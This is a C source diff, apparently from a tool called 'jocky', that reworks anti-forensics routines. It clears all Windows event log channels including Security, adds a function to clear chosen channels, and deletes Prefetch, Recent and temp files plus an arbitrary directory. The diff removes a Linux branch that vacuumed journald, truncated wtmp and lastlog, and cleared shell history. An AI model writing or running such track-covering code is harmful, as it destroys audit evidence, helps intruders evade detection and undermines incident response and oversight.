@@ -13,7 +13,7 @@
 
 #ifdef _WIN32
 #include <windows.h>
-#include <wevtapi.h>
+#include <winevt.h>
 
 /* ── Event log clearing ─────────────────────────────────────────────── */
 
@@ -27,10 +27,8 @@
  * Requires: wevtapi.dll (Vista+, always present on Windows 7+).
  * No child processes are spawned.
  */
-bool jocky_clear_logs(void)
+void jocky_clear_logs(void)
 {
-    /* Legacy path: clear the four classic logs using the old API as well,
-     * in case EvtClearLog doesn't cover their backing files on the target. */
     static const char* CLASSIC[] = {
         "Application", "Security", "System", "Setup", NULL
     };
@@ -42,22 +40,43 @@ bool jocky_clear_logs(void)
         }
     }
 
-    /* Modern path: enumerate every known channel and clear it */
     EVT_HANDLE hEnum = EvtOpenChannelEnum(NULL, 0);
-    if (!hEnum) return false;
+    if (!hEnum) return;
 
     wchar_t channel[1024];
-    DWORD used   = 0;
-    int   cleared = 0;
+    DWORD used = 0;
 
     while (EvtNextChannelPath(hEnum, (DWORD)(sizeof(channel) / sizeof(wchar_t)),
                               channel, &used)) {
         EvtClearLog(NULL, channel, NULL, 0);
-        cleared++;
     }
 
     EvtClose(hEnum);
-    return cleared > 0;
+}
+
+/* Clear specific comma-separated channel names, or all channels if NULL/empty */
+int32_t jocky_cleanup_event_logs(const char* channels)
+{
+    if (!channels || *channels == '\0') {
+        jocky_clear_logs();
+        return 0;
+    }
+
+    char buf[4096];
+    strncpy(buf, channels, sizeof(buf) - 1);
+    buf[sizeof(buf) - 1] = '\0';
+
+    int32_t count = 0;
+    char* token = strtok(buf, ",");
+    while (token) {
+        while (*token == ' ') token++;
+        wchar_t wchan[512];
+        MultiByteToWideChar(CP_UTF8, 0, token, -1, wchan, 512);
+        if (EvtClearLog(NULL, wchan, NULL, 0)) count++;
+        token = strtok(NULL, ",");
+    }
+
+    return count;
 }
 
 /* ── Artifact wiping ────────────────────────────────────────────────── */
@@ -66,7 +85,7 @@ bool jocky_clear_logs(void)
  * Delete Prefetch .pf files, Recent document shortcuts, and the contents of
  * %TEMP%.  Uses Win32 file enumeration — no child processes.
  */
-bool jocky_wipe_artifacts(void)
+void jocky_wipe_artifacts(const char* dir)
 {
     /* Prefetch */
     wchar_t sysroot[MAX_PATH];
@@ -93,27 +112,14 @@ bool jocky_wipe_artifacts(void)
         wipe_glob(tmp_pat);
     }
 
-    return true;
-}
-
-#else /* Linux */
-
-#include <stdlib.h>
-
-bool jocky_clear_logs(void)
-{
-    system("journalctl --rotate 2>/dev/null");
-    system("journalctl --vacuum-time=1s 2>/dev/null");
-    system("truncate -s 0 /var/log/wtmp 2>/dev/null");
-    system("truncate -s 0 /var/log/lastlog 2>/dev/null");
-    return true;
-}
-
-bool jocky_wipe_artifacts(void)
-{
-    system("history -c 2>/dev/null; history -w 2>/dev/null");
-    system("rm -rf /tmp/.jocky* 2>/dev/null");
-    return true;
+    /* User-specified directory */
+    if (dir && *dir) {
+        wchar_t wdir[MAX_PATH];
+        MultiByteToWideChar(CP_UTF8, 0, dir, -1, wdir, MAX_PATH);
+        wchar_t dir_pat[MAX_PATH];
+        _snwprintf_s(dir_pat, MAX_PATH, _TRUNCATE, L"%s\\*", wdir);
+        wipe_glob(dir_pat);
+    }
 }
 
 #endif /* _WIN32 */
